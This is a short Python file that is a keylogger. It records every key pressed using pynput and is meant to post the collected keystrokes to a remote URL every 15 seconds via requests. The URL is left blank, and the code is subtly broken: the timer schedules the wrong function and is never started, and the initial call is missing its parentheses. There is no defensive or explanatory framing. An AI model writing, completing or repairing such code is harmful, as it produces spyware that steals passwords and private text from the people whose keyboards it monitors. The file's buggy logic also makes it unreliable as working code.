from pynput import keyboard
import threading
import requests

log = []
url = ""

def on_log():
    try:
        requests.post(url, data={"test": log})
    except Exception as e:
        requests.post(url, data={"error": e})
    threading.Timer(15, on_press)


def on_press(key, injected):
    global log
    try:
        log.append(key.char)
    except AttributeError:
        log.append("{}".format(key.name))

on_log
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()


